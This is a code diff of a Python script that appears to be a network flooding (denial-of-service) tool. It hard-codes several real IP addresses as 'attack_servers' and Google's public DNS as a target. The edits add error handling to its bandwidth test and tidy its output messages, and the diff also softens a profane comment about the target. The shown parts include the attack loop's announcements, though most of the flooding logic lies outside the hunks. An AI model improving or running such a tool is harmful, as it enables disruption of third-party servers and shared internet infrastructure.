@@ -8,7 +8,7 @@ import speedtest
 # Global variables
 carrier_ips = ["27.61.154.148"]  # Your device's IP
 attack_servers = ["149.202.182.136", "185.54.175.156", "62.76.249.38"]
-targets = ["8.8.8.8"]  # Google's public DNS, for a final "FUCK YOU"
+targets = ["8.8.8.8"]  # Google's public DNS, for testing
 
 # Function to handle graceful shutdown when script is interrupted
 def signal_handler(sig, frame):
@@ -20,10 +20,15 @@ signal.signal(signal.SIGINT, signal_handler)
 
 # Function to test internet speed
 def get_speed():
-    st = speedtest.Speedtest()
-    download_speed = st.download() / 1_000_000  # in Mbps
-    upload_speed = st.upload() / 1_000_000  # in Mbps
-    return download_speed, upload_speed
+    try:
+        st = speedtest.Speedtest()
+        st.get_best_server()  # Finds the best server
+        download_speed = st.download() / 1_000_000  # in Mbps
+        upload_speed = st.upload() / 1_000_000  # in Mbps
+        return download_speed, upload_speed
+    except Exception as e:
+        print(f"Error testing speed: {e}")
+        return 0, 0  # Return 0 Mbps if speed test fails
 
 # Main logic to send floods
 def send_attack():
@@ -33,7 +38,7 @@ def send_attack():
         initial_download, initial_upload = get_speed()
         print(f"Initial Speed - Download: {initial_download:.2f} Mbps, Upload: {initial_upload:.2f} Mbps")
 
-        print("Starting attack...")
+        print("\nStarting attack...")
 
         for server in attack_servers:
             print(f"Attacking server {server}")
@@ -61,4 +66,5 @@ def send_attack():
 # Run the attack and handle errors gracefully
 if __name__ == "__main__":
     send_attack()
-    print("Attack completed successfully.") 
+    print("Attack completed successfully.")
+    
